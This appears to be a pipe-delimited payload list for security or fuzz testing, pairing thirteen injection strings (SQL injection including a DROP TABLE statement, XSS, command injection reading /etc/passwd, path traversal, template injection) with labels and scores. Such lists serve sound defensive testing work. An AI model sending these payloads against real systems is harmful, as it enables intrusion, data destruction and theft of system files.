' OR '1'='1|SQL injection - single quote|4
" OR "1"="1|SQL injection - double quote|4
1; DROP TABLE users--|SQL injection - statement termination|5
<script>alert(1)</script>|XSS - script tag|3
<img src=x onerror=alert(1)>|XSS - img tag|3
javascript:alert(1)|XSS - javascript protocol|3
; ls -la|Command injection - semicolon|5
| cat /etc/passwd|Command injection - pipe|5
../../../etc/passwd|Path traversal - unix|4
..\..\..\..\windows\system32|Path traversal - windows|4
%00|Null byte injection|3
{{constructor.constructor('return this')()}}|Prototype pollution|4
${7*7}|Template injection test|3
